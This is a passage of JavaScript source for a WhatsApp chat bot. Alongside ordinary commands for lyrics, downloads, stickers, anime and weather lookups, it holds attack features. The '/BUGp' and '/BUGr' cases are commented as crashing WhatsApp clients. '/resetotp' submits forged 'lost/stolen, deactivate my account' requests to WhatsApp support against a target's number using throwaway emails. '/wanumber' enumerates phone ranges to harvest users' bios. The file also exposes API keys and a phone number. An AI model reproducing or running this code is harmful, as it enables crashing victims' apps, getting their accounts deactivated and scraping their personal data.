replygcZero(`
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
}
break
case '/gdrive': {
		if (!args[0]) return replygcZero(`Enter the Google Drive link`)
	ZeroStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replygcZero(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	client.sendMessage(from, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	replygcZero('Error: Check link or try another link') 
  }
}
break
case '/invite': {
	if (!m.isGroup) return ZeroStickGroup()
	if (!isBotAdmins) return ZeroStickBotAdmin()
if (!text) return replygcZero(`Enter the number you want to invite to the group\n\nExample :\n*${prefixo + command}* 917404854406`)
if (text.includes('+')) return replygcZero(`Enter the number together without *+*`)
if (isNaN(text)) return replygcZero(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await client.groupInviteCode(group)
      await client.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcZero(` An invite link is sent to the user`) 
}
break
case "/xnxxdl": {
	if (!isPrem) return replyprem(mess.premium)
	if (!m.isGroup) return ZeroStickGroup()
	if (!AntiNsfw) return replygcZero(mess.nsfw)
	if (!text) return replygcZero(`Enter Url`)
        if (!text.includes('xnxx.com')) return replygcZero(`Enter an xnxx link`)
        ZeroStickWait()
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
client.sendMessage(from, { caption: `≡  *XNXX DL*
        
▢ *📌Title*: ${xn.result.title}
▢ *⌚Duration:* ${xn.result.duration}
▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
}
break
case '/xnxxsearch': {
	if (!isPrem) return replyprem(mess.premium)
	if (!m.isGroup) return ZeroStickGroup()
	if (!AntiNsfw) return replygcZero(mess.nsfw)
	if (!text) return replygcZero(`Enter Query`)
	ZeroStickWait()
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replygcZero(ff)
              }
              break
              case '/pinterest': {
              	if (!text) return replygcZero(`Enter Query`)
ZeroStickWait()
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
client.sendMessage(from, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case '/ringtone': {
		if (!text) return replygcZero(`Example : ${prefixo + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		client.sendMessage(from, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
	case '/genshin':
if (!text) return replygcZero(`Which genshin are you lookin for?`)
try {
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `🎀 *Name:* ${anime.name}\n`
txt += `🎖️ *Title:* ${anime.title}\n`
txt += `💠 *Vision:* ${anime.vision}\n`
txt += `🏹 *Weapon:* ${anime.weapon}\n`
txt += `💮 *Gender:* ${anime.gender}\n`
txt += `🌏 *Nation:* ${anime.nation}\n`
txt += `🪷 *Affiliation:* ${anime.affiliation}\n`
txt += `🌟 *Rarity:* ${anime.rarity}\n`
txt += `❄️ *Constellation:* ${anime.constellation}\n`
txt += `📖 *Description:* ${anime.description}\n`
txt += `🌐 *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await client.sendMessage(from,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return replygcZero('Error')
}
break
case '/patrick':
case '/patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case '/dogesticker':
case '/dogestick':
	case '/doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case '/lovesticker':
case '/lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case '/gura':
case '/gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/Daveshvats/something/master/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
	case '/anime': {
if (!text) return replygcZero(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
ZeroStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcZero(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await client.sendMessage(from,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
                case '/imdb':
if (!text) return replygcZero(`_Name a Series or movie`)
ZeroStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           client.sendMessage(from, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case '/weather':{
if (!text) return replygcZero('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           client.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case '/wanumber': case '/searchno': case '/searchnumber':{
           	if (!text) return replygcZero(`Provide Number with last number x\n\nExample: ${prefixo + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcZero(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await client.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await client.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcZero(`${text66}${nobio}${nowhatsapp}`)
        }
break
	//bug && war cases
case '/BUGp' : { //crashes mod whatsapps
if (!ZeroTheCreator) return ZeroStickOwner()
if (!text) return replygcZero(`Example : ${prefixo + command} Zero bihari😂`)
const { Zeroorwot } = require('./wbug/Zerobut2')
let teks = `${text}`
{
client.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${Zeroorwot}`, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `PAPA Zero`,"body": ` ${Zeroytimewisher} my friend ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${Zeroorwot}`,
showAdAttribution: true,
sourceUrl: websitex,
thumbnailUrl: thumb, 
}
}}}}}, { quoted:m})
}
}
break
case '/BUGr':{ //crashes both mod and playstore wa
if (!ZeroTheCreator) return ZeroStickOwner()
const { Zeroorwot } = require('./wbug/Zerobut2')
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "" })
client.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}
break
case "/resetotp": {
if (Input) {
let cekno = await client.onWhatsApp(Input)
if (cekno.length == 0) return replygcZero(`The participant is no longer registered on WhatsApp`)
if (Input == owner + "@s.whatsapp.net") return replygcZero(`Can't logout My Owner🦄!`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/?subject=messenger")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=190308")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", `${Input.split("@")[0]}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Perdido/roubado: desative minha conta`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcZero(`Success..!`)
} else if (payload.includes(`"payload":false`)) {
replygcZero(`Moderate Limit Wait A Moment.`)
} else replygcZero(util.format(res.data))
} catch (err) {replygcZero(`${err}`)}
} else replygcZero('Enter Target Number!')
}
break

default:

if (budy.startsWith('<')) {
if (!ZeroTheCreator) return
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith('vv')) {
if (!ZeroTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!ZeroTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
client.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
client.sendMessage("917404854406@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
